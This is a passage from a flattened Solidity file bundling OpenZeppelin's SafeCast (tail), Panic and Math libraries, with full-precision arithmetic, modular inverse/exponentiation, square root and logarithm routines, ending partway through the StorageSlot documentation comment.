        downcasted = int40(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(40, value);
        }
    }

    /**
     * @dev Returns the downcasted int32 from int256, reverting on
     * overflow (when the input is less than smallest int32 or
     * greater than largest int32).
     *
     * Counterpart to Solidity's `int32` operator.
     *
     * Requirements:
     *
     * - input must fit into 32 bits
     */
    function toInt32(int256 value) internal pure returns (int32 downcasted) {
        downcasted = int32(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(32, value);
        }
    }

    /**
     * @dev Returns the downcasted int24 from int256, reverting on
     * overflow (when the input is less than smallest int24 or
     * greater than largest int24).
     *
     * Counterpart to Solidity's `int24` operator.
     *
     * Requirements:
     *
     * - input must fit into 24 bits
     */
    function toInt24(int256 value) internal pure returns (int24 downcasted) {
        downcasted = int24(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(24, value);
        }
    }

    /**
     * @dev Returns the downcasted int16 from int256, reverting on
     * overflow (when the input is less than smallest int16 or
     * greater than largest int16).
     *
     * Counterpart to Solidity's `int16` operator.
     *
     * Requirements:
     *
     * - input must fit into 16 bits
     */
    function toInt16(int256 value) internal pure returns (int16 downcasted) {
        downcasted = int16(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(16, value);
        }
    }

    /**
     * @dev Returns the downcasted int8 from int256, reverting on
     * overflow (when the input is less than smallest int8 or
     * greater than largest int8).
     *
     * Counterpart to Solidity's `int8` operator.
     *
     * Requirements:
     *
     * - input must fit into 8 bits
     */
    function toInt8(int256 value) internal pure returns (int8 downcasted) {
        downcasted = int8(value);
        if (downcasted != value) {
            revert SafeCastOverflowedIntDowncast(8, value);
        }
    }

    /**
     * @dev Converts an unsigned uint256 into a signed int256.
     *
     * Requirements:
     *
     * - input must be less than or equal to maxInt256.
     */
    function toInt256(uint256 value) internal pure returns (int256) {
        // Note: Unsafe cast below is okay because `type(int256).max` is guaranteed to be positive
        if (value > uint256(type(int256).max)) {
            revert SafeCastOverflowedUintToInt(value);
        }
        return int256(value);
    }

    /**
     * @dev Cast a boolean (false or true) to a uint256 (0 or 1) with no jump.
     */
    function toUint(bool b) internal pure returns (uint256 u) {
        assembly ("memory-safe") {
            u := iszero(iszero(b))
        }
    }
}

// File: @openzeppelin/contracts/utils/Panic.sol


// OpenZeppelin Contracts (last updated v5.1.0) (utils/Panic.sol)

pragma solidity ^0.8.20;

/**
 * @dev Helper library for emitting standardized panic codes.
 *
 * ```solidity
 * contract Example {
 *      using Panic for uint256;
 *
 *      // Use any of the declared internal constants
 *      function foo() { Panic.GENERIC.panic(); }
 *
 *      // Alternatively
 *      function foo() { Panic.panic(Panic.GENERIC); }
 * }
 * ```
 *
 * Follows the list from https://github.com/ethereum/solidity/blob/v0.8.24/libsolutil/ErrorCodes.h[libsolutil].
 *
 * _Available since v5.1._
 */
// slither-disable-next-line unused-state
library Panic {
    /// @dev generic / unspecified error
    uint256 internal constant GENERIC = 0x00;
    /// @dev used by the assert() builtin
    uint256 internal constant ASSERT = 0x01;
    /// @dev arithmetic underflow or overflow
    uint256 internal constant UNDER_OVERFLOW = 0x11;
    /// @dev division or modulo by zero
    uint256 internal constant DIVISION_BY_ZERO = 0x12;
    /// @dev enum conversion error
    uint256 internal constant ENUM_CONVERSION_ERROR = 0x21;
    /// @dev invalid encoding in storage
    uint256 internal constant STORAGE_ENCODING_ERROR = 0x22;
    /// @dev empty array pop
    uint256 internal constant EMPTY_ARRAY_POP = 0x31;
    /// @dev array out of bounds access
    uint256 internal constant ARRAY_OUT_OF_BOUNDS = 0x32;
    /// @dev resource error (too large allocation or too large array)
    uint256 internal constant RESOURCE_ERROR = 0x41;
    /// @dev calling invalid internal function
    uint256 internal constant INVALID_INTERNAL_FUNCTION = 0x51;

    /// @dev Reverts with a panic code. Recommended to use with
    /// the internal constants with predefined codes.
    function panic(uint256 code) internal pure {
        assembly ("memory-safe") {
            mstore(0x00, 0x4e487b71)
            mstore(0x20, code)
            revert(0x1c, 0x24)
        }
    }
}

// File: @openzeppelin/contracts/utils/math/Math.sol


// OpenZeppelin Contracts (last updated v5.3.0) (utils/math/Math.sol)

pragma solidity ^0.8.20;



/**
 * @dev Standard math utilities missing in the Solidity language.
 */
library Math {
    enum Rounding {
        Floor, // Toward negative infinity
        Ceil, // Toward positive infinity
        Trunc, // Toward zero
        Expand // Away from zero
    }

    /**
     * @dev Return the 512-bit addition of two uint256.
     *
     * The result is stored in two 256 variables such that sum = high * 2²⁵⁶ + low.
     */
    function add512(uint256 a, uint256 b) internal pure returns (uint256 high, uint256 low) {
        assembly ("memory-safe") {
            low := add(a, b)
            high := lt(low, a)
        }
    }

    /**
     * @dev Return the 512-bit multiplication of two uint256.
     *
     * The result is stored in two 256 variables such that product = high * 2²⁵⁶ + low.
     */
    function mul512(uint256 a, uint256 b) internal pure returns (uint256 high, uint256 low) {
        // 512-bit multiply [high low] = x * y. Compute the product mod 2²⁵⁶ and mod 2²⁵⁶ - 1, then use
        // the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256
        // variables such that product = high * 2²⁵⁶ + low.
        assembly ("memory-safe") {
            let mm := mulmod(a, b, not(0))
            low := mul(a, b)
            high := sub(sub(mm, low), lt(mm, low))
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, with a success flag (no overflow).
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {
        unchecked {
            uint256 c = a + b;
            success = c >= a;
            result = c * SafeCast.toUint(success);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with a success flag (no overflow).
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {
        unchecked {
            uint256 c = a - b;
            success = c <= a;
            result = c * SafeCast.toUint(success);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with a success flag (no overflow).
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {
        unchecked {
            uint256 c = a * b;
            assembly ("memory-safe") {
                // Only true when the multiplication doesn't overflow
                // (c / a == b) || (a == 0)
                success := or(eq(div(c, a), b), iszero(a))
            }
            // equivalent to: success ? c : 0
            result = c * SafeCast.toUint(success);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a success flag (no division by zero).
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {
        unchecked {
            success = b > 0;
            assembly ("memory-safe") {
                // The `DIV` opcode returns zero when the denominator is 0.
                result := div(a, b)
            }
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a success flag (no division by zero).
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {
        unchecked {
            success = b > 0;
            assembly ("memory-safe") {
                // The `MOD` opcode returns zero when the denominator is 0.
                result := mod(a, b)
            }
        }
    }

    /**
     * @dev Unsigned saturating addition, bounds to `2²⁵⁶ - 1` instead of overflowing.
     */
    function saturatingAdd(uint256 a, uint256 b) internal pure returns (uint256) {
        (bool success, uint256 result) = tryAdd(a, b);
        return ternary(success, result, type(uint256).max);
    }

    /**
     * @dev Unsigned saturating subtraction, bounds to zero instead of overflowing.
     */
    function saturatingSub(uint256 a, uint256 b) internal pure returns (uint256) {
        (, uint256 result) = trySub(a, b);
        return result;
    }

    /**
     * @dev Unsigned saturating multiplication, bounds to `2²⁵⁶ - 1` instead of overflowing.
     */
    function saturatingMul(uint256 a, uint256 b) internal pure returns (uint256) {
        (bool success, uint256 result) = tryMul(a, b);
        return ternary(success, result, type(uint256).max);
    }

    /**
     * @dev Branchless ternary evaluation for `a ? b : c`. Gas costs are constant.
     *
     * IMPORTANT: This function may reduce bytecode size and consume less gas when used standalone.
     * However, the compiler may optimize Solidity ternary operations (i.e. `a ? b : c`) to only compute
     * one branch when needed, making this function more expensive.
     */
    function ternary(bool condition, uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            // branchless ternary works because:
            // b ^ (a ^ b) == a
            // b ^ 0 == b
            return b ^ ((a ^ b) * SafeCast.toUint(condition));
        }
    }

    /**
     * @dev Returns the largest of two numbers.
     */
    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return ternary(a > b, a, b);
    }

    /**
     * @dev Returns the smallest of two numbers.
     */
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return ternary(a < b, a, b);
    }

    /**
     * @dev Returns the average of two numbers. The result is rounded towards
     * zero.
     */
    function average(uint256 a, uint256 b) internal pure returns (uint256) {
        // (a + b) / 2 can overflow.
        return (a & b) + (a ^ b) / 2;
    }

    /**
     * @dev Returns the ceiling of the division of two numbers.
     *
     * This differs from standard division with `/` in that it rounds towards infinity instead
     * of rounding towards zero.
     */
    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        if (b == 0) {
            // Guarantee the same behavior as in a regular Solidity division.
            Panic.panic(Panic.DIVISION_BY_ZERO);
        }

        // The following calculation ensures accurate ceiling division without overflow.
        // Since a is non-zero, (a - 1) / b will not overflow.
        // The largest possible result occurs when (a - 1) / b is type(uint256).max,
        // but the largest value we can obtain is type(uint256).max - 1, which happens
        // when a = type(uint256).max and b = 1.
        unchecked {
            return SafeCast.toUint(a > 0) * ((a - 1) / b + 1);
        }
    }

    /**
     * @dev Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or
     * denominator == 0.
     *
     * Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv) with further edits by
     * Uniswap Labs also under MIT license.
     */
    function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {
        unchecked {
            (uint256 high, uint256 low) = mul512(x, y);

            // Handle non-overflow cases, 256 by 256 division.
            if (high == 0) {
                // Solidity will revert if denominator == 0, unlike the div opcode on its own.
                // The surrounding unchecked block does not change this fact.
                // See https://docs.soliditylang.org/en/latest/control-structures.html#checked-or-unchecked-arithmetic.
                return low / denominator;
            }

            // Make sure the result is less than 2²⁵⁶. Also prevents denominator == 0.
            if (denominator <= high) {
                Panic.panic(ternary(denominator == 0, Panic.DIVISION_BY_ZERO, Panic.UNDER_OVERFLOW));
            }

            ///////////////////////////////////////////////
            // 512 by 256 division.
            ///////////////////////////////////////////////

            // Make division exact by subtracting the remainder from [high low].
            uint256 remainder;
            assembly ("memory-safe") {
                // Compute remainder using mulmod.
                remainder := mulmod(x, y, denominator)

                // Subtract 256 bit number from 512 bit number.
                high := sub(high, gt(remainder, low))
                low := sub(low, remainder)
            }

            // Factor powers of two out of denominator and compute largest power of two divisor of denominator.
            // Always >= 1. See https://cs.stackexchange.com/q/138556/92363.

            uint256 twos = denominator & (0 - denominator);
            assembly ("memory-safe") {
                // Divide denominator by twos.
                denominator := div(denominator, twos)

                // Divide [high low] by twos.
                low := div(low, twos)

                // Flip twos such that it is 2²⁵⁶ / twos. If twos is zero, then it becomes one.
                twos := add(div(sub(0, twos), twos), 1)
            }

            // Shift in bits from high into low.
            low |= high * twos;

            // Invert denominator mod 2²⁵⁶. Now that denominator is an odd number, it has an inverse modulo 2²⁵⁶ such
            // that denominator * inv ≡ 1 mod 2²⁵⁶. Compute the inverse by starting with a seed that is correct for
            // four bits. That is, denominator * inv ≡ 1 mod 2⁴.
            uint256 inverse = (3 * denominator) ^ 2;

            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also
            // works in modular arithmetic, doubling the correct bits in each step.
            inverse *= 2 - denominator * inverse; // inverse mod 2⁸
            inverse *= 2 - denominator * inverse; // inverse mod 2¹⁶
            inverse *= 2 - denominator * inverse; // inverse mod 2³²
            inverse *= 2 - denominator * inverse; // inverse mod 2⁶⁴
            inverse *= 2 - denominator * inverse; // inverse mod 2¹²⁸
            inverse *= 2 - denominator * inverse; // inverse mod 2²⁵⁶

            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.
            // This will give us the correct result modulo 2²⁵⁶. Since the preconditions guarantee that the outcome is
            // less than 2²⁵⁶, this is the final result. We don't need to compute the high bits of the result and high
            // is no longer required.
            result = low * inverse;
            return result;
        }
    }

    /**
     * @dev Calculates x * y / denominator with full precision, following the selected rounding direction.
     */
    function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {
        return mulDiv(x, y, denominator) + SafeCast.toUint(unsignedRoundsUp(rounding) && mulmod(x, y, denominator) > 0);
    }

    /**
     * @dev Calculates floor(x * y >> n) with full precision. Throws if result overflows a uint256.
     */
    function mulShr(uint256 x, uint256 y, uint8 n) internal pure returns (uint256 result) {
        unchecked {
            (uint256 high, uint256 low) = mul512(x, y);
            if (high >= 1 << n) {
                Panic.panic(Panic.UNDER_OVERFLOW);
            }
            return (high << (256 - n)) | (low >> n);
        }
    }

    /**
     * @dev Calculates x * y >> n with full precision, following the selected rounding direction.
     */
    function mulShr(uint256 x, uint256 y, uint8 n, Rounding rounding) internal pure returns (uint256) {
        return mulShr(x, y, n) + SafeCast.toUint(unsignedRoundsUp(rounding) && mulmod(x, y, 1 << n) > 0);
    }

    /**
     * @dev Calculate the modular multiplicative inverse of a number in Z/nZ.
     *
     * If n is a prime, then Z/nZ is a field. In that case all elements are inversible, except 0.
     * If n is not a prime, then Z/nZ is not a field, and some elements might not be inversible.
     *
     * If the input value is not inversible, 0 is returned.
     *
     * NOTE: If you know for sure that n is (big) a prime, it may be cheaper to use Fermat's little theorem and get the
     * inverse using `Math.modExp(a, n - 2, n)`. See {invModPrime}.
     */
    function invMod(uint256 a, uint256 n) internal pure returns (uint256) {
        unchecked {
            if (n == 0) return 0;

            // The inverse modulo is calculated using the Extended Euclidean Algorithm (iterative version)
            // Used to compute integers x and y such that: ax + ny = gcd(a, n).
            // When the gcd is 1, then the inverse of a modulo n exists and it's x.
            // ax + ny = 1
            // ax = 1 + (-y)n
            // ax ≡ 1 (mod n) # x is the inverse of a modulo n

            // If the remainder is 0 the gcd is n right away.
            uint256 remainder = a % n;
            uint256 gcd = n;

            // Therefore the initial coefficients are:
            // ax + ny = gcd(a, n) = n
            // 0a + 1n = n
            int256 x = 0;
            int256 y = 1;

            while (remainder != 0) {
                uint256 quotient = gcd / remainder;

                (gcd, remainder) = (
                    // The old remainder is the next gcd to try.
                    remainder,
                    // Compute the next remainder.
                    // Can't overflow given that (a % gcd) * (gcd // (a % gcd)) <= gcd
                    // where gcd is at most n (capped to type(uint256).max)
                    gcd - remainder * quotient
                );

                (x, y) = (
                    // Increment the coefficient of a.
                    y,
                    // Decrement the coefficient of n.
                    // Can overflow, but the result is casted to uint256 so that the
                    // next value of y is "wrapped around" to a value between 0 and n - 1.
                    x - y * int256(quotient)
                );
            }

            if (gcd != 1) return 0; // No inverse exists.
            return ternary(x < 0, n - uint256(-x), uint256(x)); // Wrap the result if it's negative.
        }
    }

    /**
     * @dev Variant of {invMod}. More efficient, but only works if `p` is known to be a prime greater than `2`.
     *
     * From https://en.wikipedia.org/wiki/Fermat%27s_little_theorem[Fermat's little theorem], we know that if p is
     * prime, then `a**(p-1) ≡ 1 mod p`. As a consequence, we have `a * a**(p-2) ≡ 1 mod p`, which means that
     * `a**(p-2)` is the modular multiplicative inverse of a in Fp.
     *
     * NOTE: this function does NOT check that `p` is a prime greater than `2`.
     */
    function invModPrime(uint256 a, uint256 p) internal view returns (uint256) {
        unchecked {
            return Math.modExp(a, p - 2, p);
        }
    }

    /**
     * @dev Returns the modular exponentiation of the specified base, exponent and modulus (b ** e % m)
     *
     * Requirements:
     * - modulus can't be zero
     * - underlying staticcall to precompile must succeed
     *
     * IMPORTANT: The result is only valid if the underlying call succeeds. When using this function, make
     * sure the chain you're using it on supports the precompiled contract for modular exponentiation
     * at address 0x05 as specified in https://eips.ethereum.org/EIPS/eip-198[EIP-198]. Otherwise,
     * the underlying function will succeed given the lack of a revert, but the result may be incorrectly
     * interpreted as 0.
     */
    function modExp(uint256 b, uint256 e, uint256 m) internal view returns (uint256) {
        (bool success, uint256 result) = tryModExp(b, e, m);
        if (!success) {
            Panic.panic(Panic.DIVISION_BY_ZERO);
        }
        return result;
    }

    /**
     * @dev Returns the modular exponentiation of the specified base, exponent and modulus (b ** e % m).
     * It includes a success flag indicating if the operation succeeded. Operation will be marked as failed if trying
     * to operate modulo 0 or if the underlying precompile reverted.
     *
     * IMPORTANT: The result is only valid if the success flag is true. When using this function, make sure the chain
     * you're using it on supports the precompiled contract for modular exponentiation at address 0x05 as specified in
     * https://eips.ethereum.org/EIPS/eip-198[EIP-198]. Otherwise, the underlying function will succeed given the lack
     * of a revert, but the result may be incorrectly interpreted as 0.
     */
    function tryModExp(uint256 b, uint256 e, uint256 m) internal view returns (bool success, uint256 result) {
        if (m == 0) return (false, 0);
        assembly ("memory-safe") {
            let ptr := mload(0x40)
            // | Offset    | Content    | Content (Hex)                                                      |
            // |-----------|------------|--------------------------------------------------------------------|
            // | 0x00:0x1f | size of b  | 0x0000000000000000000000000000000000000000000000000000000000000020 |
            // | 0x20:0x3f | size of e  | 0x0000000000000000000000000000000000000000000000000000000000000020 |
            // | 0x40:0x5f | size of m  | 0x0000000000000000000000000000000000000000000000000000000000000020 |
            // | 0x60:0x7f | value of b | 0x<.............................................................b> |
            // | 0x80:0x9f | value of e | 0x<.............................................................e> |
            // | 0xa0:0xbf | value of m | 0x<.............................................................m> |
            mstore(ptr, 0x20)
            mstore(add(ptr, 0x20), 0x20)
            mstore(add(ptr, 0x40), 0x20)
            mstore(add(ptr, 0x60), b)
            mstore(add(ptr, 0x80), e)
            mstore(add(ptr, 0xa0), m)

            // Given the result < m, it's guaranteed to fit in 32 bytes,
            // so we can use the memory scratch space located at offset 0.
            success := staticcall(gas(), 0x05, ptr, 0xc0, 0x00, 0x20)
            result := mload(0x00)
        }
    }

    /**
     * @dev Variant of {modExp} that supports inputs of arbitrary length.
     */
    function modExp(bytes memory b, bytes memory e, bytes memory m) internal view returns (bytes memory) {
        (bool success, bytes memory result) = tryModExp(b, e, m);
        if (!success) {
            Panic.panic(Panic.DIVISION_BY_ZERO);
        }
        return result;
    }

    /**
     * @dev Variant of {tryModExp} that supports inputs of arbitrary length.
     */
    function tryModExp(
        bytes memory b,
        bytes memory e,
        bytes memory m
    ) internal view returns (bool success, bytes memory result) {
        if (_zeroBytes(m)) return (false, new bytes(0));

        uint256 mLen = m.length;

        // Encode call args in result and move the free memory pointer
        result = abi.encodePacked(b.length, e.length, mLen, b, e, m);

        assembly ("memory-safe") {
            let dataPtr := add(result, 0x20)
            // Write result on top of args to avoid allocating extra memory.
            success := staticcall(gas(), 0x05, dataPtr, mload(result), dataPtr, mLen)
            // Overwrite the length.
            // result.length > returndatasize() is guaranteed because returndatasize() == m.length
            mstore(result, mLen)
            // Set the memory pointer after the returned data.
            mstore(0x40, add(dataPtr, mLen))
        }
    }

    /**
     * @dev Returns whether the provided byte array is zero.
     */
    function _zeroBytes(bytes memory byteArray) private pure returns (bool) {
        for (uint256 i = 0; i < byteArray.length; ++i) {
            if (byteArray[i] != 0) {
                return false;
            }
        }
        return true;
    }

    /**
     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded
     * towards zero.
     *
     * This method is based on Newton's method for computing square roots; the algorithm is restricted to only
     * using integer operations.
     */
    function sqrt(uint256 a) internal pure returns (uint256) {
        unchecked {
            // Take care of easy edge cases when a == 0 or a == 1
            if (a <= 1) {
                return a;
            }

            // In this function, we use Newton's method to get a root of `f(x) := x² - a`. It involves building a
            // sequence x_n that converges toward sqrt(a). For each iteration x_n, we also define the error between
            // the current value as `ε_n = | x_n - sqrt(a) |`.
            //
            // For our first estimation, we consider `e` the smallest power of 2 which is bigger than the square root
            // of the target. (i.e. `2**(e-1) ≤ sqrt(a) < 2**e`). We know that `e ≤ 128` because `(2¹²⁸)² = 2²⁵⁶` is
            // bigger than any uint256.
            //
            // By noticing that
            // `2**(e-1) ≤ sqrt(a) < 2**e → (2**(e-1))² ≤ a < (2**e)² → 2**(2*e-2) ≤ a < 2**(2*e)`
            // we can deduce that `e - 1` is `log2(a) / 2`. We can thus compute `x_n = 2**(e-1)` using a method similar
            // to the msb function.
            uint256 aa = a;
            uint256 xn = 1;

            if (aa >= (1 << 128)) {
                aa >>= 128;
                xn <<= 64;
            }
            if (aa >= (1 << 64)) {
                aa >>= 64;
                xn <<= 32;
            }
            if (aa >= (1 << 32)) {
                aa >>= 32;
                xn <<= 16;
            }
            if (aa >= (1 << 16)) {
                aa >>= 16;
                xn <<= 8;
            }
            if (aa >= (1 << 8)) {
                aa >>= 8;
                xn <<= 4;
            }
            if (aa >= (1 << 4)) {
                aa >>= 4;
                xn <<= 2;
            }
            if (aa >= (1 << 2)) {
                xn <<= 1;
            }

            // We now have x_n such that `x_n = 2**(e-1) ≤ sqrt(a) < 2**e = 2 * x_n`. This implies ε_n ≤ 2**(e-1).
            //
            // We can refine our estimation by noticing that the middle of that interval minimizes the error.
            // If we move x_n to equal 2**(e-1) + 2**(e-2), then we reduce the error to ε_n ≤ 2**(e-2).
            // This is going to be our x_0 (and ε_0)
            xn = (3 * xn) >> 1; // ε_0 := | x_0 - sqrt(a) | ≤ 2**(e-2)

            // From here, Newton's method give us:
            // x_{n+1} = (x_n + a / x_n) / 2
            //
            // One should note that:
            // x_{n+1}² - a = ((x_n + a / x_n) / 2)² - a
            //              = ((x_n² + a) / (2 * x_n))² - a
            //              = (x_n⁴ + 2 * a * x_n² + a²) / (4 * x_n²) - a
            //              = (x_n⁴ + 2 * a * x_n² + a² - 4 * a * x_n²) / (4 * x_n²)
            //              = (x_n⁴ - 2 * a * x_n² + a²) / (4 * x_n²)
            //              = (x_n² - a)² / (2 * x_n)²
            //              = ((x_n² - a) / (2 * x_n))²
            //              ≥ 0
            // Which proves that for all n ≥ 1, sqrt(a) ≤ x_n
            //
            // This gives us the proof of quadratic convergence of the sequence:
            // ε_{n+1} = | x_{n+1} - sqrt(a) |
            //         = | (x_n + a / x_n) / 2 - sqrt(a) |
            //         = | (x_n² + a - 2*x_n*sqrt(a)) / (2 * x_n) |
            //         = | (x_n - sqrt(a))² / (2 * x_n) |
            //         = | ε_n² / (2 * x_n) |
            //         = ε_n² / | (2 * x_n) |
            //
            // For the first iteration, we have a special case where x_0 is known:
            // ε_1 = ε_0² / | (2 * x_0) |
            //     ≤ (2**(e-2))² / (2 * (2**(e-1) + 2**(e-2)))
            //     ≤ 2**(2*e-4) / (3 * 2**(e-1))
            //     ≤ 2**(e-3) / 3
            //     ≤ 2**(e-3-log2(3))
            //     ≤ 2**(e-4.5)
            //
            // For the following iterations, we use the fact that, 2**(e-1) ≤ sqrt(a) ≤ x_n:
            // ε_{n+1} = ε_n² / | (2 * x_n) |
            //         ≤ (2**(e-k))² / (2 * 2**(e-1))
            //         ≤ 2**(2*e-2*k) / 2**e
            //         ≤ 2**(e-2*k)
            xn = (xn + a / xn) >> 1; // ε_1 := | x_1 - sqrt(a) | ≤ 2**(e-4.5)  -- special case, see above
            xn = (xn + a / xn) >> 1; // ε_2 := | x_2 - sqrt(a) | ≤ 2**(e-9)    -- general case with k = 4.5
            xn = (xn + a / xn) >> 1; // ε_3 := | x_3 - sqrt(a) | ≤ 2**(e-18)   -- general case with k = 9
            xn = (xn + a / xn) >> 1; // ε_4 := | x_4 - sqrt(a) | ≤ 2**(e-36)   -- general case with k = 18
            xn = (xn + a / xn) >> 1; // ε_5 := | x_5 - sqrt(a) | ≤ 2**(e-72)   -- general case with k = 36
            xn = (xn + a / xn) >> 1; // ε_6 := | x_6 - sqrt(a) | ≤ 2**(e-144)  -- general case with k = 72

            // Because e ≤ 128 (as discussed during the first estimation phase), we know have reached a precision
            // ε_6 ≤ 2**(e-144) < 1. Given we're operating on integers, then we can ensure that xn is now either
            // sqrt(a) or sqrt(a) + 1.
            return xn - SafeCast.toUint(xn > a / xn);
        }
    }

    /**
     * @dev Calculates sqrt(a), following the selected rounding direction.
     */
    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {
        unchecked {
            uint256 result = sqrt(a);
            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && result * result < a);
        }
    }

    /**
     * @dev Return the log in base 2 of a positive value rounded towards zero.
     * Returns 0 if given 0.
     */
    function log2(uint256 x) internal pure returns (uint256 r) {
        // If value has upper 128 bits set, log2 result is at least 128
        r = SafeCast.toUint(x > 0xffffffffffffffffffffffffffffffff) << 7;
        // If upper 64 bits of 128-bit half set, add 64 to result
        r |= SafeCast.toUint((x >> r) > 0xffffffffffffffff) << 6;
        // If upper 32 bits of 64-bit half set, add 32 to result
        r |= SafeCast.toUint((x >> r) > 0xffffffff) << 5;
        // If upper 16 bits of 32-bit half set, add 16 to result
        r |= SafeCast.toUint((x >> r) > 0xffff) << 4;
        // If upper 8 bits of 16-bit half set, add 8 to result
        r |= SafeCast.toUint((x >> r) > 0xff) << 3;
        // If upper 4 bits of 8-bit half set, add 4 to result
        r |= SafeCast.toUint((x >> r) > 0xf) << 2;

        // Shifts value right by the current result and use it as an index into this lookup table:
        //
        // | x (4 bits) |  index  | table[index] = MSB position |
        // |------------|---------|-----------------------------|
        // |    0000    |    0    |        table[0] = 0         |
        // |    0001    |    1    |        table[1] = 0         |
        // |    0010    |    2    |        table[2] = 1         |
        // |    0011    |    3    |        table[3] = 1         |
        // |    0100    |    4    |        table[4] = 2         |
        // |    0101    |    5    |        table[5] = 2         |
        // |    0110    |    6    |        table[6] = 2         |
        // |    0111    |    7    |        table[7] = 2         |
        // |    1000    |    8    |        table[8] = 3         |
        // |    1001    |    9    |        table[9] = 3         |
        // |    1010    |   10    |        table[10] = 3        |
        // |    1011    |   11    |        table[11] = 3        |
        // |    1100    |   12    |        table[12] = 3        |
        // |    1101    |   13    |        table[13] = 3        |
        // |    1110    |   14    |        table[14] = 3        |
        // |    1111    |   15    |        table[15] = 3        |
        //
        // The lookup table is represented as a 32-byte value with the MSB positions for 0-15 in the last 16 bytes.
        assembly ("memory-safe") {
            r := or(r, byte(shr(r, x), 0x0000010102020202030303030303030300000000000000000000000000000000))
        }
    }

    /**
     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.
     * Returns 0 if given 0.
     */
    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {
        unchecked {
            uint256 result = log2(value);
            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && 1 << result < value);
        }
    }

    /**
     * @dev Return the log in base 10 of a positive value rounded towards zero.
     * Returns 0 if given 0.
     */
    function log10(uint256 value) internal pure returns (uint256) {
        uint256 result = 0;
        unchecked {
            if (value >= 10 ** 64) {
                value /= 10 ** 64;
                result += 64;
            }
            if (value >= 10 ** 32) {
                value /= 10 ** 32;
                result += 32;
            }
            if (value >= 10 ** 16) {
                value /= 10 ** 16;
                result += 16;
            }
            if (value >= 10 ** 8) {
                value /= 10 ** 8;
                result += 8;
            }
            if (value >= 10 ** 4) {
                value /= 10 ** 4;
                result += 4;
            }
            if (value >= 10 ** 2) {
                value /= 10 ** 2;
                result += 2;
            }
            if (value >= 10 ** 1) {
                result += 1;
            }
        }
        return result;
    }

    /**
     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.
     * Returns 0 if given 0.
     */
    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {
        unchecked {
            uint256 result = log10(value);
            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && 10 ** result < value);
        }
    }

    /**
     * @dev Return the log in base 256 of a positive value rounded towards zero.
     * Returns 0 if given 0.
     *
     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.
     */
    function log256(uint256 x) internal pure returns (uint256 r) {
        // If value has upper 128 bits set, log2 result is at least 128
        r = SafeCast.toUint(x > 0xffffffffffffffffffffffffffffffff) << 7;
        // If upper 64 bits of 128-bit half set, add 64 to result
        r |= SafeCast.toUint((x >> r) > 0xffffffffffffffff) << 6;
        // If upper 32 bits of 64-bit half set, add 32 to result
        r |= SafeCast.toUint((x >> r) > 0xffffffff) << 5;
        // If upper 16 bits of 32-bit half set, add 16 to result
        r |= SafeCast.toUint((x >> r) > 0xffff) << 4;
        // Add 1 if upper 8 bits of 16-bit half set, and divide accumulated result by 8
        return (r >> 3) | SafeCast.toUint((x >> r) > 0xff);
    }

    /**
     * @dev Return the log in base 256, following the selected rounding direction, of a positive value.
     * Returns 0 if given 0.
     */
    function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {
        unchecked {
            uint256 result = log256(value);
            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && 1 << (result << 3) < value);
        }
    }

    /**
     * @dev Returns whether a provided rounding mode is considered rounding up for unsigned integers.
     */
    function unsignedRoundsUp(Rounding rounding) internal pure returns (bool) {
        return uint8(rounding) % 2 == 1;
    }
}

// File: @openzeppelin/contracts/utils/StorageSlot.sol


// OpenZeppelin Contracts (last updated v5.1.0) (utils/StorageSlot.sol)
// This file was procedurally generated from scripts/generate/templates/StorageSlot.js.

pragma solidity ^0.8.20;

/**
 * @dev Library for reading and writing primitive types to specific storage slots.
 *
 * Storage slots are often used to avoid storage conflict when dealing with upgradeable contracts.
 * This library helps with reading and writing to such slots without the need for inline assembly.
 *
 * The functions in this library return Slot structs that contain a `value` member that can be used to read or write.
 *
 * Example usage to set ERC-1967 implementation slot:
 * ```solidity
 * contract ERC1967 {
 *     // Define the slot. Alternatively, use the SlotDerivation library to derive the slot.
 *     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
 *
 *     function _getImplementation() internal view returns (address) {
 *         return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;
 *     }
 *
 *     function _setImplementation(address newImplementation) internal {
 *         require(newImplementation.code.length > 0);
 *         StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;
 *     }
 * }
 * ```
 *
